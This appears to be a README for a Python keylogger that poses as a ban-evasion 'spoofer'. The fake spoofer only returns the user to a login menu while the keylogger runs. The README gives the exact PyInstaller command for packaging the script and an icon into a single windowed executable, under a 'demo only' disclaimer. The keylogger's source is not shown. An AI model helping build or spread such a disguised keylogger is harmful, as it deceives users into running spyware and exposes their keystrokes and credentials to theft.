Demo only! Do not use for malicious purposes, obviously.

The keylogger is disguised as a spoofer to evade application/software bans.
Spoofer doesn't actually work, just loops you back into the login menu

Put home.ico and RealAzzSpoofPublic.py into a folder together and build into an exe using PyInstaller with this prompt in a terminal:

py -m PyInstaller --clean --noconfirm --onefile --windowed --icon=home.ico --add-data "home.ico;." RealAzzSpoofPublic.py   

Made by jamsish
